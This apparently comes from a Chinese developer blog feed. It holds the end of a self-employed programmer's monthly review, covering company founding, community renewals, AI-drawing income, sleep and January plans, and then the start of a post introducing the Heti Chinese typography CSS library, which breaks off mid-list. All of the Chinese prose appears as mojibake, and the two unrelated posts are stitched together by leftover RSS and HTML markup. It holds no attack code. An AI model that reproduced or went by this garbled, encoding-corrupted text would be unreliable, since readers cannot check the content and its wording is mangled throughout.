<p>è¿™ä¸ªæœˆä¸‹æ—¬å’Œä¹‹å‰ç¦AIçš„å‡ ä¸ªçº¿ä¸‹æˆå‘˜ä¸€èµ·æˆç«‹äº†å…¬å¸ï¼Œæ ¸å¿ƒç›®çš„æ˜¯æ›´å¥½çš„æ‰¿æ¥ç›¸å…³çš„ä¸šåŠ¡ï¼Œç­¾åˆåŒçš„æ—¶å€™æ–¹ä¾¿ã€‚æ‰€ä»¥è¿™ä¸ªæœˆçº¿ä¸‹äº‹æƒ…å¾ˆå¤šï¼Œå„ç§å¼€ä¼šğŸ˜®â€ğŸ’¨ï¼Œæ–°å…¬å¸æˆç«‹äº†æˆ‘ä»¬è®¨è®ºåå†³å®šå®šä¸‹æ¥å‡ ä¸ªèµ›é“å…ˆåšï¼Œæ‰€ä»¥æˆ‘è¿™ä¸ªæœˆä¸‹æ—¬å‚åŠ äº†ç ´å±€çš„ä¸€ä¸ªè§†é¢‘å·å¸¦è´§çš„ï¼Œè¿™ä¸ªç®—æ˜¯å…¬å¸æœªæ¥ä¸€ä¸ªé¡¹ç›®æ–¹å‘ï¼Œç›®å‰å…ˆæš‚æ—¶ç”±æˆ‘ç‰µå¤´æ¨è¿›è¿™é¡¹ä¸šåŠ¡ã€‚æˆ‘è‡ªå·±çš„ComfyUIç”µå•†èµ›é“çš„ä¹ŸåŒ…è£…äº†ä¸€ä¸‹å½“åšå…¬å¸çš„äº§å“å»æ¨å¹¿ã€‚</p>
<p><strong>4ï¼šç¤¾ç¾¤ç»­è´¹</strong></p>
<p>ä»Šå¹´ç¤¾ç¾¤çš„ç»­è´¹å…¶å®å¼„çš„æœ‰ç‚¹ä»“ä¿ƒï¼Œäº‹æƒ…å¤ªå¤šäº†ï¼Œ ä¸€ç›´æ‹–åˆ°12æœˆ25å·ï¼Œä¹Ÿå°±æ˜¯åœ£è¯èŠ‚è¿™å¤©ï¼Œæ™šä¸Š10ç‚¹å·¦å³æ‰æ€¥æ€¥å¿™å¿™çš„å‘å‡ºæ¥ï¼Œä»Šå¹´ç¡®å®äº‹æƒ…å¤ªå¤šï¼Œç¤¾ç¾¤äº¤ä»˜æ²¡æœ‰å»å¹´å¯†é›†ï¼Œæ‰€ä»¥æ•´ä½“ç»­è´¹ç‡æ²¡æœ‰å»å¹´çš„é«˜ï¼Œåªæœ‰60%å·¦å³çš„ç»­è´¹ç‡ï¼Œå»å¹´æˆ‘è®°å¾—æ˜¯65%ï¼Œä¹Ÿæ˜¯æ„Ÿè°¢å¤§å®¶çš„æ”¯æŒï¼Œæ–°ç”¨æˆ·ä¹Ÿæœ‰å‡ ä¸ªåŠ å…¥ã€‚</p>
<p>æ–°çš„ä¸€å¹´æœŸå¾…å’Œå¤§å®¶æœ‰æ›´å¤šé¢äº¤æµï¼Œå…¶å®ç›®å‰æœ‰æŒºå¤šéå¸¸å¥½çš„èµ›é“ï¼Œæˆ‘æ˜¯å·²ç»å®šä¸‹æ¥åœ¨AIç»˜ç”»è¿™ä¸ªèµ›é“æ·±è€•ï¼Œæ‰€ä»¥æ²¡ç²¾åŠ›å»åšåˆ«çš„ï¼Œä½†æ˜¯æˆ‘ä¸€ç›´æ¨èæˆ‘èº«è¾¹çš„å°ä¼™ä¼´å»å°è¯•ï¼Œæœ‰çº¢åˆ©æœŸã€‚</p>
<h2 data-id="heading-1">äºŒã€æœ‰ä»€ä¹ˆæ”¶è·</h2>
<h3 data-id="heading-2">ã€è®¤çŸ¥æ–¹é¢ã€‘</h3>
<p><strong>1ï¼šæµæ°´ä¸äº‰å…ˆï¼Œäº‰çš„æ˜¯æ»”æ»”ä¸ç»</strong></p>
<p>è¿™å¥è¯æ”¾åœ¨æœ€åä¸€ä¸ªæœˆæ¥è¯´ï¼Œä¹Ÿå¯ä»¥æ€»ç»“æˆ‘è¿™ä¸€å¹´å§ï¼Œæˆ‘è¿™ä¸ªèµ›é“ä¸å¥½åšï¼Œæ•°æ®ä¸å¥½ï¼Œä½†æ˜¯æˆ‘åšæŒä¸‹æ¥äº†ï¼Œå¾ˆå¤šå’Œæˆ‘ä¸€èµ·åšçš„äººï¼Œåšç€åšç€å°±æ¶ˆå¤±äº†ï¼Œæˆ‘çš„ç«äº‰å¯¹æ‰‹å°±å°‘äº†ï¼Œæˆ‘çš„å…¬ä¼—å·ç›®å‰å·²ç»ç®—æ˜¯ComfyUIçš„å…¨å›½å¤´éƒ¨äº†ï¼Œæ²¡æœ‰äººæ¯”æˆ‘æ›´æ–°çš„æ›´å¤šæ›´ç¨³å®šã€‚</p>
<p>å› ä¸ºæŒç»­çš„åœ¨åšæŒè¾“å‡ºï¼Œæœºä¼šåè€Œå˜å¾—è¶Šæ¥è¶Šå¤šï¼Œæ›´å¤šçš„äººé“¾æ¥è¿‡æ¥ï¼Œæ›´å¤šçš„åˆä½œæœºä¼šï¼Œä»¥åŠä¸Šé¢æçš„åšæŒäº†5ä¸ªæœˆå¼€é€šäº†æ²¹ç®¡YPPåˆ›ä½œæ”¶ç›Šã€‚</p>
<p>æˆ‘å…¶å®ä¸€ç›´å¾ˆç¾¡æ…•é‚£äº›ä¸€ä¸ªå·å°±æœ‰å‡ ç™¾ä¸‡ç²‰ä¸ï¼Œå…‰é è¿™ä¸ªå·å°±å¯ä»¥å…»æ´»ä¸€ä¸ªå…¬å¸çš„é‚£ç§ï¼Œæˆ‘ä¹Ÿæƒ³è¿™æ ·ï¼Œé ä¸€ä¸ªå·å…»æ´»æˆ‘è‡ªå·±ï¼Œç°åœ¨æˆ‘çœ‹åˆ°äº†è‹—å¤´ï¼Œè¿™ä¸€å¹´çš„åŠªåŠ›æ²¡æœ‰ç™½è´¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8476523835aa45508a9f96096c179ea8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Zif5ZifTUQ=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767971161&amp;x-signature=GH%2Fh7iYHsovyicSN6KXn9u0OHMA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<h3 data-id="heading-3">ã€æ”¶å…¥æ–¹é¢ã€‘</h3>
<p>è¿™ä¸ªæœˆé™¤äº†ç¨³å®šçš„ç¨¿è´¹åï¼Œå¤šäº†å•†å•ä»¥åŠç¤¾ç¾¤ç»­è´¹ï¼Œæ‰€ä»¥æ•´ä½“ä¸Šè¿˜è¡Œï¼Œç®—æ˜¯ç»™2025å¹´æ”¶ä¸ªå¥½å°¾ï¼Œ2026å¹´è¦ç»§ç»­åŠªåŠ›ï¼Œäº‰å–çº¿ä¸‹å…¬å¸çš„ä¸šåŠ¡ä¹Ÿèƒ½å‘å±•èµ·æ¥ã€‚</p>
<ul>
<li>1ï¼šæ—§çš„å‡ ä¸ªå‰¯ä¸šæ”¶ç›Šï¼ˆæ—§çš„æ”¶ç›Šå¼€å§‹ä¸ç¨³å®šäº†ï¼‰</li>
<li>2ï¼šAIç»˜ç”»ç›¸å…³å˜ç°ï¼ˆç›®å‰å¯ä»¥ç¨³å®šæœˆ8000+ï¼‰</li>
<li>3ï¼šç¤¾ç¾¤ç»­è´¹+å•†å•æ”¶å…¥</li>
<li/>
<li>ç›®å‰æˆ‘çš„æ”¶ç›Šä½“ç³»å’Œå‰ä¸€å¹´å˜åŒ–è¿˜æ˜¯å¾ˆå¤§çš„ï¼Œæ—§çš„æ”¶ç›Šç¡®å®ä¸€ç›´åœ¨é™ä½ï¼Œæ„Ÿè§‰æ˜å¹´å°±ä¼šæ²¡äº†ï¼Œè¿™ä¹Ÿæ²¡åŠæ³•ï¼Œæ²¡æœ‰æ—¶é—´ç²¾åŠ›æŠ•å…¥ï¼Œèººèµšäº†å‡ å¹´ä¹Ÿå·®ä¸å¤šäº†ï¼Œ åé¢ä¼šæ›´åŠ èšç„¦AIç»˜ç”»è¿™ä¸ªèµ›é“ï¼ŒåŠªåŠ›æŒ–æ˜ä¸€äº›æœ‰ç¦åˆ©çš„æ”¶å…¥æ¸ é“ã€‚</li>
</ul>
<h3 data-id="heading-4">ã€æŠ€èƒ½æ–¹é¢ã€‘</h3>
<p><strong>1ï¼šä¹¦å•å·å‰ªè¾‘å’Œåˆ›ä½œ</strong></p>
<p>è¿™ä¸ªæœˆä¸‹æ—¬å…¶å®åœ¨åŠªåŠ›çš„æ¨è¿›çº¿ä¸‹å…¬å¸å®‰æ’çš„ä»»åŠ¡ï¼Œå°±æ˜¯åšä¹¦å•å·ï¼Œæ‰€ä»¥å„ç§å­¦ä¹ å‰ªè¾‘çš„åŠŸèƒ½ï¼Œä¹Ÿæ˜¯æŠ½æ—¶é—´å­¦ï¼Œè¿™ä¸ªæœˆæ„Ÿè§‰å¿™çš„é£èµ·ï¼Œå„ç§äº‹æƒ…éƒ½è¦åšã€‚</p>
<h2 data-id="heading-5">ä¸‰ã€é—®é¢˜</h2>
<p>è¿™ä¸ªæœˆé—®é¢˜æœ‰ç‚¹å¤šï¼Œç»§ç»­ç½—åˆ—ä¸€ä¸‹ï¼š</p>
<p><strong>1ï¼šç¡çœ +å¥èº«</strong></p>
<p>è€èº«é•¿è°ˆé—®é¢˜ï¼Œèº«ä½“ç¡®å®å˜å·®äº†ï¼Œå…ç–«åŠ›ä¸‹é™ï¼Œè¿˜æ˜¯ç†¬å¤œçš„é—®é¢˜ï¼Œè·‘æ­¥çš„è¯å°±è·‘äº†å‡ å¤©ï¼Œå¤§å¤šæ•°å°±æ˜¯å»å…¬å›­æ•£å®Œæ­¥ï¼Œæ¯å¤©ç¡è§‰æ—¶é—´æŒ¤å‹åœ¨5å°æ—¶ï¼Œç†¬å¤œåˆ°å‡Œæ™¨3ç‚¹ï¼Œæ—©ä¸Š8ç‚¹é†’çš„å¤§æœ‰æ—¶å€™ã€‚è¿™æ ·å°±å¯¼è‡´äº†æˆ‘ä¸€æ•´å¤©ç²¾æ°”ç¥ä¸å¤§å¤Ÿã€‚</p>
<p><strong>2ï¼šäº§å“é—®é¢˜</strong></p>
<p>äº§å“æ‰‹å†Œ12æœˆæœ‰æ›´æ–°ï¼Œä½†æ˜¯åé¢åˆå› ä¸ºå…¶ä»–äº‹æƒ…å¾ˆå¿™ï¼Œå°±è¢«æ¨åäº†ï¼Œæ„Ÿè§‰è¢«æˆ‘æ¨äº†ä¸€æ•´å¹´ï¼Œè¿™è®©æˆ‘ä¸å¾—ä¸æ€è€ƒè¿™ä¸ªäº§å“æ‰‹å†Œåˆ°åº•æ˜¯ä¸æ˜¯ä¸ªå¿…éœ€å“ã€‚çœŸä»¤äººå¤´å¤§ï¼Œå¼„å¾—æ¯ä¸ªæœˆéƒ½è¦è®¡åˆ’å®Œæ•´ï¼Œä½†æ˜¯åˆè¢«æ‹–å»¶ï¼Œå¼„å¾—æˆ‘éƒ½ç„¦è™‘äº†ã€‚</p>
<h2 data-id="heading-6">å››ã€ä¸‹æœˆè®¡åˆ’</h2>
<p>æ–°å¹´1æœˆä»½ï¼Œæˆ‘ç½—åˆ—äº†ä¸€ä¸‹é‡è¦çš„è®¡åˆ’ï¼š</p>
<p><strong>1ï¼šæ—©ç¡æ—©èµ·+å‡è‚¥</strong></p>
<p>æ–°çš„ä¸€å¹´ï¼ŒæŠŠæ—©ç¡æ—©èµ·åˆ—å…¥æœ€é«˜ä¼˜å…ˆçº§ï¼Œ25å¹´æœ€åä¸€å¤©å»ä¸ˆæ¯å¨˜å®¶åƒé¥­ï¼Œè¢«è¯´æ˜¯ä¸æ˜¯èƒ–äº†å“ˆå“ˆï¼Œç¡®å®ï¼Œä¸€ç›´ä¹…åï¼Œæ„Ÿè§‰è‚šå­æ¯”ä¹‹å‰å¤§äº†äº›ï¼Œè¿™è¿˜å¾—äº†ï¼Œæ–°å¹´å¿…é¡»å‡è‚¥ï¼</p>
<p><strong>2ï¼šé¡¹ç›®SOPæ‰‹å†Œçš„åˆ¶ä½œ</strong></p>
<p>è´Ÿè´£çš„è§†é¢‘ä¹¦å•å·é¡¹ç›®1æœˆä»½è¦æŠŠSOPæ‰‹å†Œæå‡ºæ¥ï¼Œæ–¹ä¾¿åç»­åŸ¹è®­ç”¨ï¼Œè¿™ä¸ªç®—æ˜¯1æœˆä»½æ¯”è¾ƒé‡è¦çš„äº‹æƒ…ï¼Œæˆ‘è‡ªå·±çš„äº§å“çš„è¯å¦‚æœå¯ä»¥å°±åŒæ­¥æ›´æ–°ã€‚</p>
<h2 data-id="heading-7">äº”ã€æ€»ç»“</h2>
<p>ä¸Šé¢ç®—æ˜¯æˆ‘è¿™ä¸ªæœˆçš„ä¸€äº›é‡è¦äº‹æƒ…çš„æ€»ç»“ï¼Œæˆ‘åˆ†äº«å‡ºæ¥ä¹Ÿæ˜¯ç»™å¤§å®¶å¯ä»¥è¿‘è·ç¦»çœ‹çœ‹ä¸€ä¸ªç¦»èŒçš„ç¨‹åºå‘˜çš„æ—¥å¸¸ï¼Œæœ‰åšçš„ä¸å¥½çš„åœ°æ–¹ä¹Ÿæœ‰åšçš„å¯å–çš„åœ°æ–¹ï¼Œæˆ‘ä¹Ÿæ˜¯ä¸ªæ™®é€šäººï¼Œä¸€ç›´åœ¨å°è¯•å’ŒæŒ£æ‰ï¼Œæˆ‘å†™è¿™ç¯‡æœˆåº¦æ€»ç»“ï¼Œæ˜¯å»ç¿»æˆ‘è¿™ä¸ªæœˆå‘çš„å…¬ä¼—å·æ–‡ç« ï¼Œç„¶åæå–å‡ºæ¥çš„ï¼Œä¸ç„¶æˆ‘æ—©å¿˜è®°äº†ï¼Œä»¥åå¹´åº¦æ€»ç»“ä¹Ÿå¯ä»¥å›çœ‹æœˆåº¦æ€»ç»“ï¼Œä¹Ÿèƒ½æç‚¼ï¼æ‰€ä»¥ï¼Œæˆ‘å†™çš„ä¸œè¥¿åŠ¡å¿…æ˜¯è¦çœŸå®ï¼Œä¸èƒ½è‡ªå·±éª—è‡ªå·±ï¼</p>
<p>æˆ‘æ˜¯å˜Ÿå˜Ÿï¼Œä¸€ä¸ª12å¹´å…¨æ ˆç¨‹åºå‘˜ï¼Œç°åœ¨ç¦»èŒåˆ›ä¸šï¼Œéœ€è¦ä½ çš„ä¸‰è¿~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[èµ«è¹(hÃ¨tÃ­):ä¸ºä¸­æ–‡ç½‘é¡µå†…å®¹èµ‹äºˆä¼˜é›…æ’ç‰ˆçš„å¼€æºåˆ©å™¨]]></title>    <link>https://juejin.cn/post/7589932422654836772</link>    <guid>https://juejin.cn/post/7589932422654836772</guid>    <pubDate>2026-01-02T15:42:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589932422654836772" data-draft-id="7589919989039235135" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="èµ«è¹(hÃ¨tÃ­):ä¸ºä¸­æ–‡ç½‘é¡µå†…å®¹èµ‹äºˆä¼˜é›…æ’ç‰ˆçš„å¼€æºåˆ©å™¨"/> <meta itemprop="keywords" content="å¼€æº"/> <meta itemprop="datePublished" content="2026-01-02T15:42:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¿®å·±xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            èµ«è¹(hÃ¨tÃ­):ä¸ºä¸­æ–‡ç½‘é¡µå†…å®¹èµ‹äºˆä¼˜é›…æ’ç‰ˆçš„å¼€æºåˆ©å™¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¿®å·±xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T15:42:40.000Z" title="Fri Jan 02 2026 15:42:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0e03929226554e518e5ee5904a9c78f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767973359&amp;x-signature=uh3uCw%2FigvJkXddGXki2h6BEb%2BM%3D" alt="fHJ9cZeOp.jpg" loading="lazy"/></p>
<p>fHJ9cZeOp.jpg</p>
<p>åœ¨å½“ä»Šä¿¡æ¯çˆ†ç‚¸çš„æ—¶ä»£ï¼Œå†…å®¹å‘ˆç°çš„å½¢å¼å¾€å¾€å†³å®šäº†é˜…è¯»ä½“éªŒçš„ä¼˜åŠ£ã€‚å¯¹äºä¸­æ–‡ç½‘ç«™æ¥è¯´ï¼Œä¸€ä¸ªé•¿æœŸå­˜åœ¨çš„æŒ‘æˆ˜æ˜¯å¦‚ä½•å®ç°ç¬¦åˆä¼ ç»Ÿä¸­æ–‡æ’ç‰ˆç¾å­¦çš„ç½‘é¡µå±•ç¤ºã€‚å°½ç®¡ç°ä»£CSSæŠ€æœ¯å·²ç»ååˆ†å¼ºå¤§ï¼Œä½†é’ˆå¯¹ä¸­æ–‡ç‰¹ç‚¹çš„æ’ç‰ˆä¼˜åŒ–ä»ç„¶ä¸å¤Ÿå®Œå–„ã€‚ä»Šå¤©ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä¸€ä¸ªä¸“é—¨ä¸ºè§£å†³è¿™ä¸€é—®é¢˜è€Œç”Ÿçš„å¼€æºé¡¹ç›®â€”â€”<strong>èµ«è¹</strong>ï¼ˆhÃ¨tÃ­ï¼‰ã€‚</p>
<h2 data-id="heading-0">ä»€ä¹ˆæ˜¯èµ«è¹ï¼Ÿ</h2>
<p>èµ«è¹æ˜¯ä¸€ä¸ªä¸“ä¸ºä¸­æ–‡å†…å®¹å±•ç¤ºè®¾è®¡çš„æ’ç‰ˆæ ·å¼å¢å¼ºåº“ï¼Œåç§°å–è‡ªå¤ä»£å¯¹çº¸å¼ çš„é›…ç§°ã€‚è¿™ä¸ªé¡¹ç›®ç”±å¼€å‘è€…Sivanåˆ›å»ºï¼ŒåŸºäºé€šè¡Œçš„ä¸­æ–‡æ’ç‰ˆè§„èŒƒï¼Œæ—¨åœ¨ä¸ºç½‘ç«™çš„è¯»è€…æä¾›æ›´åŠ èˆ’é€‚ã€ä¸“ä¸šçš„æ–‡ç« é˜…è¯»ä½“éªŒã€‚</p>
<p>ç®€å•æ¥è¯´ï¼Œ<strong>èµ«è¹è®©ä¸­æ–‡ç½‘é¡µå†…å®¹â€œè‡ªåŠ¨å˜å¥½çœ‹â€</strong> ã€‚</p>
<p>è¯¥é¡¹ç›®åœ¨github å·²æœ‰6.6k star</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce0f630a865241b0a5dbf6d4ff5fc843~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767973359&amp;x-signature=9xQC5WG4FwXVNsC1CeTZRlVMG9E%3D" alt="_20260102_222650.png" loading="lazy"/></p>
<p>_20260102_222650.png</p>
<ul>
<li>github åœ°å€ï¼š <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fsivan%2Fheti" target="_blank" title="https://github.com/sivan/heti" ref="nofollow noopener noreferrer">github.com/sivan/heti</a></li>
<li>åœ¨çº¿é¢„è§ˆåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fsivan.github.io%2Fheti%2F" target="_blank" title="https://sivan.github.io/heti/" ref="nofollow noopener noreferrer">sivan.github.io/heti/</a></li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6df3713ee7848e39606c2fbf09bba09~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767973359&amp;x-signature=4T8HTedr%2Bmyatk7rQ%2FK3iSUPqBc%3D" alt="_20260102_223923.png" loading="lazy"/></p>
<p>_20260102_223923.png</p>
<h2 data-id="heading-1">æ ¸å¿ƒç‰¹æ€§ä¸€è§ˆ</h2>
<h3 data-id="heading-2">ğŸ¯ è´´åˆç½‘æ ¼çš„ç²¾å‡†æ’ç‰ˆ</h3>
<p>èµ«è¹å®ç°äº†åŸºäºç½‘æ ¼ç³»ç»Ÿçš„ä¸­æ–‡æ’ç‰ˆï¼Œç¡®ä¿æ–‡å­—ã€æ®µè½å’Œé—´è·éƒ½éµå¾ªä¸¥è°¨çš„è§†è§‰è§„å¾‹ï¼Œè®©é¡µé¢å‘ˆç°å‡ºæ•´é½åˆ’ä¸€çš„ä¸“ä¸šæ„Ÿã€‚</p>
<h3 data-id="heading-3">ğŸ“ å…¨æ ‡ç­¾æ ·å¼ç¾åŒ–</h3>
<p>é¡¹ç›®ä¸ä»…ä»…é’ˆå¯¹æ®µè½æ–‡æœ¬ï¼Œè€Œæ˜¯å¯¹æ•´ä¸ªHTMLæ–‡æ¡£ä¸­çš„å„ç±»æ ‡ç­¾ï¼ˆæ ‡é¢˜ã€åˆ—è¡¨ã€è¡¨æ ¼ã€ä»£ç å—ç­‰ï¼‰éƒ½è¿›è¡Œäº†ç»†è‡´çš„ç¾åŒ–ï¼Œå½¢æˆç»Ÿä¸€è€Œå’Œè°çš„æ•´ä½“è§†è§‰é£æ ¼ã€‚</p>
<h3 data-id="heading-4">ğŸ® ä¼ ç»Ÿç‰ˆå¼æ”¯æŒ</h3>
<p>èµ«è¹è´´å¿ƒåœ°é¢„ç½®äº†<strong>å¤æ–‡ã€è¯—è¯æ ·å¼</strong>ï¼Œå¹¶æä¾›äº†å¤šç§ä¼ ç»Ÿæ’ç‰ˆæ ·å¼æ”¯æŒï¼š</p>
<ul>
<li>è¡Œé—´æ³¨ï¼ˆç±»ä¼¼äºå¤ç±ä¸­çš„åŒè¡Œå°æ³¨ï¼‰</li>
<li>å¤šæ æ’ç‰ˆ</li>
<li>ç«–æ’æ–‡å­—</li>
<li>ä¸ºéœ€è¦å±•ç¤ºä¼ ç»Ÿæ–‡å­¦å†…å®¹çš„ç½‘ç«™æä¾›äº†æå¤§ä¾¿åˆ©</li>
</ul>
<h3 data-id="heading-5">ğŸŒ— æ™ºèƒ½é€‚é…è®¾è®¡</h3>
<ul>
<li><strong>è‡ªé€‚åº”é»‘æš—æ¨¡å¼</strong>ï¼šè·Ÿéšç³»ç»Ÿè®¾ç½®è‡ªåŠ¨åˆ‡æ¢æ˜æš—ä¸»é¢˜</li>
<li><strong>ç§»åŠ¨ç«¯ä¼˜å…ˆ</strong>ï¼šåœ¨å„ç§å±å¹•å°ºå¯¸ä¸Šéƒ½æœ‰è‰¯å¥½è¡¨ç°</li>
<li><strong>ç®€ç¹ä¸­æ–‡æ”¯æŒ</strong>ï¼šæ»¡è¶³ä¸åŒåœ°åŒºç”¨æˆ·çš„éœ€æ±‚</li>
</ul>
<h3 data-id="heading-6">âœ¨ æ™ºèƒ½æ’ç‰ˆå¢å¼ºï¼ˆåŸºäºJavaScriptï¼‰</h3>
<p>è¿™æ˜¯èµ«è¹çš„â€œé»‘ç§‘æŠ€â€éƒ¨åˆ†ï¼š</p>
<ul>
